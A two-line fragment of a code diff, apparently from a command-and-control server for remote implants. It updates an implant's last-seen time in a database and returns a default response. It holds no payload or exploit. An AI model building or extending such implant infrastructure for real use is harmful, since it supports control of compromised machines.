+                DB.update_implant_lastseen(now.strftime("%Y-%m-%d %H:%M:%S"), RandomURI)
+                return default_response()
